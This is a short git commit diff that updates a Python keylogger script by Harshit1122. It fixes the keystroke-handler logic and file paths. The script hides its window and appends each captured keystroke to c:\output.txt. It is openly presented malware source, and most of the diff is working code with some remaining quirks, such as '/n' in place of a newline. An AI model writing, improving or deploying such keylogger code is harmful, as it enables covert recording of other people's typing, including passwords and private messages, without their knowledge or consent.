bf7fff3071a2cf0f19c651fa0d10f6dc959891d2
Harshit1122 <60482236+Harshit1122@users.noreply.github.com>
2024-08-11 13:48:35 +0530

    Update Keylogger in python.py

--- Keylogger in python.py
+++ Keylogger in python.py
@@ -8,17 +8,17 @@ win32gui.ShowWindow(win, 0)
 
 def OnKeyboardEvent(event):
 	if event.Ascii==5:
-		_exit(1)
-	if event.Ascii !=0 or 8:
+		exit(1)
+	if event.Ascii not in (0,8):
 	#open output.txt to read current keystrokes
-		f = open('c:\output.txt', 'r+')
+		f = open('c:\\output.txt', 'r+')
 		buffer = f.read()
 		f.close()
 	# open output.txt to write current + new keystrokes
 		f = open('c:\output.txt', 'w')
 		keylogs = chr(event.Ascii)
 		if event.Ascii == 13:
-		keylogs = '/n'
+		 keylogs = '/n'
 		buffer += keylogs
 		f.write(buffer)
 		f.close()
